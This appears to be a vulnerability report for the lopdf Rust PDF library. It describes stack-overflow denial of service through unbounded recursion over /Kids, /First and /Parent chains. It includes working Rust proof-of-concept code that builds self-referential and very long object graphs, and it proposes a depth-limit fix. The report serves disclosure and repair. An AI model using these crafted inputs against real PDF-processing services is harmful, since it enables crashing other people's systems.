# ISSUE — lopdf: unbounded recursion over the Document object graph (`/Kids`, `/First`, `/Parent`) — a patch-gap on RUSTSEC-2026-0187

**Title:** Unbounded recursion in `get_named_destinations`, `get_outlines`, `get_page_resources`, and `delete_outlines` — stack-overflow DoS on crafted/cyclic PDF structure

### Summary

RUSTSEC-2026-0187 (fixed in 0.42.0, commit c755394) bounded **parser** recursion with `MAX_NESTING_DEPTH`
(`_direct_object`/`array`/`inner_dictionary`/`_dictionary` in `parser/mod.rs`). That fix does not extend to
several **post-load `Document` graph-walk** methods, which still recurse over the *parsed* object graph
(each hop a separate, already-parsed object — outside the parser's per-call nesting budget) with **no depth
cap**, and in two cases **no cycle guard either**. A crafted or self-referential PDF drives each of the
following into an uncatchable stack-overflow abort:

| # | function | file | guard present | guard missing |
|---|---|---|---|---|
| 1 | `Document::get_named_destinations` | `src/destinations.rs:39` (recurses on `/Kids`) | — | depth cap, cycle guard |
| 2 | `Document::get_outlines` | `src/outlines.rs:79` (recurses on `/First`; `/Next` is iterative) | — | depth cap, cycle guard |
| 3 | `Document::get_page_resources::collect_resources` | `src/document.rs:676` (recurses on `/Parent`) | cycle guard (`already_seen: HashSet`) | depth cap (a long **non-cyclic** chain is not caught) |
| 4 | `Document::delete_outlines::walk_outlines_del` | `src/outlines.rs:146` (recurses on `/First`) | — | depth cap, cycle guard |

All four are reachable from public, ordinary-looking APIs (`get_named_destinations`, `get_outlines`,
`get_toc` → `get_outlines`, `get_page_resources`, `get_page_fonts`/`get_page_images` → `get_page_resources`,
`delete_outlines`) — not just at `load_mem`.

### PoC (direct calls on a crafted object graph; each aborts with `stack overflow, aborting`)

```rust
use lopdf::{Document, Object, StringFormat, dictionary};

// #1: self-referential /Kids
let mut doc = Document::with_version("1.5");
doc.objects.insert((10,0), Object::Dictionary(dictionary!{ "Kids"=>Object::Array(vec![Object::Reference((10,0))]) }));
let tree = dictionary!{ "Kids"=>Object::Array(vec![Object::Reference((10,0))]) };
let mut map = Default::default();
let _ = doc.get_named_destinations(&tree, &mut map); // stack overflow

// #2: self-referential /First
let mut doc = Document::with_version("1.5");
doc.objects.insert((6,0), Object::Dictionary(dictionary!{ "Title"=>Object::String(b"x".to_vec(), StringFormat::Literal), "First"=>Object::Reference((6,0)) }));
let mut map = Default::default();
let _ = doc.get_outlines(Some(Object::Reference((6,0))), Some(Vec::new()), &mut map); // stack overflow

// #3: a LINEAR (non-cyclic) chain of 200,000 distinct /Parent dicts also overflows -- already_seen
// only rejects a repeated id, it never bounds a long chain of DISTINCT ids.
let mut doc = Document::with_version("1.5");
doc.objects.insert((0,0), Object::Dictionary(dictionary!{ "Parent"=>Object::Reference((1,0)) }));
for i in 1..200_000u32 { doc.objects.insert((i,0), Object::Dictionary(dictionary!{ "Parent"=>Object::Reference((i+1,0)) })); }
doc.objects.insert((200_000,0), Object::Dictionary(dictionary!{}));
let _ = doc.get_page_resources((0,0)); // stack overflow

// #4: self-referential /First on the delete_outlines() path
let mut doc = Document::with_version("1.5");
doc.objects.insert((6,0), Object::Dictionary(dictionary!{ "Title"=>Object::String(b"x".to_vec(), StringFormat::Literal), "First"=>Object::Reference((6,0)) }));
doc.objects.insert((5,0), Object::Dictionary(dictionary!{ "First"=>Object::Reference((6,0)) }));
doc.objects.insert((1,0), Object::Dictionary(dictionary!{ "Type"=>Object::Name(b"Catalog".to_vec()), "Outlines"=>Object::Reference((5,0)) }));
doc.trailer.set("Root", Object::Reference((1,0)));
let _ = doc.delete_outlines(); // stack overflow
```

Confirmed on `main` (commit 1efa270). A control test — a 2-node `/Parent` **cycle** through
`get_page_resources` — is correctly caught by `already_seen` (`Err(ReferenceCycle)`, no crash), so #3 is
specifically about a **long, non-cyclic** chain, which no existing guard bounds.

### Suggested fix

Bound each traversal by the crate's own `MAX_NESTING_DEPTH` (the same constant the 0187 parser fix uses,
`src/reader.rs:475`), same spirit as the existing `PAGE_TREE_DEPTH_LIMIT` on `PageTreeIter`. I have a patch
(new `Error::RecursionLimit`, depth threading via a private `_impl` twin for the two public entry points so
their signatures don't change, `already_seen.len()` reused as the depth counter for #3) — all four PoCs now
return a clean `Err(RecursionLimit)` instead of aborting, and the existing 2-node-cycle control case is
unaffected. Full test suite passes. Happy to open a PR.

Found by the [rust-in-peace](https://github.com/scadastrangelove/rust-in-peace) security pipeline.
